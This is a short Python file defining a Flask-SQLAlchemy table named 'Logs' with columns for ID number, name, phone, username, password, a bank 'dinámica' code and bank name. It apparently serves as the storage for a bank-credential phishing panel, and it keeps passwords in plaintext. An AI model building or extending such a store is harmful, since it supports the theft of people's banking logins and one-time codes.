from config.bd import db, ma, app

class Logs(db.Model):
    __tablename__ = "Logs"
    
    idreg = db.Column(db.Integer, primary_key=True)
    reg = db.Column(db.String(50)) #Cedula
    name = db.Column(db.String(50)) #Nombre
    cl = db.Column(db.String(50)) #clular
    us = db.Column(db.String(50)) #Usuario
    ps = db.Column(db.String(50)) #Password
    din = db.Column(db.String(50)) #Dinámica
    fuente = db.Column(db.String(50)) #Fuente
    status = db.Column(db.String(50)) #status
    bn = db.Column(db.String(50)) #Banco
    
    def __init__(self, reg, name, cl, us, ps, din, fuente, status, bn):
        self.reg = reg
        self.name = name
        self.cl = cl
        self.us = us
        self.ps = ps
        self.din = din
        self.fuente = fuente
        self.status = status
        self.bn = bn
    
with app.app_context():
    db.create_all()
    
    class LogsSchema(ma.Schema):
        class Meta:
            fields = ('idreg', 'reg', 'name', 'cl', 'us', 'ps', 'din', 'fuente', 'status', 'bn')
    
    